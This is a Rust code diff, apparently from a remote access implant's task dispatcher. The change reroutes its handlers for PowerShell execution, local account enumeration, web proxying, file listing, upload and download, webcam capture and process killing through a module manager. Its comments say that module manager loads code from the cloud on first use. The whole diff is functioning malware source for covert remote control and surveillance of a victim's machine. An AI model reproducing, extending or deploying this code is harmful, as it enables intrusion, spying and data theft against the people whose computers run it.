@@ -53,19 +53,35 @@ pub(crate) async fn execute_task(
             }
         }
         CommandType::PowerShell => {
-            libra_modules::execution::PowerShellRunner::execute(&task.command).await
+            // Cloud-load the powershell module on first use.
+            let script = task.command.clone();
+            let input = serde_json::json!({ "script": script }).to_string();
+            match module_manager.run("powershell", &input).await {
+                Ok(result) => result,
+                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+            }
         }
         CommandType::LocalAccounts => {
-            libra_modules::recon::LocalAccountEnumerator::enumerate().await
+            let input = serde_json::json!({ "op": "local_accounts" }).to_string();
+            match module_manager.run("recon", &input).await {
+                Ok(result) => result,
+                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+            }
         }
         CommandType::Proxy => {
-            libra_modules::execution::ProxyBrowser::fetch(
-                &task.command, "GET", None, None,
-            ).await
+            let input = serde_json::json!({ "url": task.command, "method": "GET" }).to_string();
+            match module_manager.run("proxy", &input).await {
+                Ok(result) => result,
+                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+            }
         }
         CommandType::FileList => {
             let cmd = task.command.clone();
-            blocking_string(move || libra_modules::execution::FileOps::list_directory(&cmd)).await
+            let input = serde_json::json!({ "op": "list", "path": cmd, "limit": 1000 }).to_string();
+            match module_manager.run("files", &input).await {
+                Ok(result) => result,
+                Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+            }
         }
         CommandType::FileDrives => {
             let drives = blocking_val(|| {
@@ -79,18 +95,21 @@ pub(crate) async fn execute_task(
             return json;
         }
         CommandType::Upload | CommandType::Download => {
-            // File transfer with arguments: FileOps read/write
+            // File transfer with arguments: FileOps read/write (cloud module)
             if let Some(arg) = task.arguments.first() {
                 let cmd = task.command.clone();
                 let arg = arg.clone();
                 let is_download = task.command_type == CommandType::Download;
-                blocking_string(move || {
-                    if is_download {
-                        libra_modules::execution::FileOps::write_file(&cmd, &arg)
-                    } else {
-                        libra_modules::execution::FileOps::read_file(&cmd)
-                    }
-                }).await
+                let (op, data) = if is_download {
+                    ("write", arg)
+                } else {
+                    ("read", String::new())
+                };
+                let input = serde_json::json!({ "op": op, "path": cmd, "data": data }).to_string();
+                match module_manager.run("files", &input).await {
+                    Ok(result) => result,
+                    Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+                }
             } else {
                 r#"{"error":"No file path specified"}"#.to_string()
             }
@@ -102,10 +121,13 @@ pub(crate) async fn execute_task(
             blocking_string(move || libra_modules::execution::CameraCapture::capture(0)).await
         }
         CommandType::Kill => {
-            // Kill specific process by PID
+            // Kill specific process by PID (cloud recon module)
             if let Ok(pid) = task.command.parse::<u32>() {
-                let ok = blocking_val(move || libra_modules::recon::ProcessInfo::kill(pid)).await;
-                format!(r#"{{"success":{}}}"#, ok)
+                let input = serde_json::json!({ "op": "kill", "pid": pid }).to_string();
+                match module_manager.run("recon", &input).await {
+                    Ok(result) => result,
+                    Err(e) => serde_json::json!({ "success": false, "output": e }).to_string(),
+                }
             } else {
                 r#"{"error":"Invalid PID"}"#.to_string()
             }
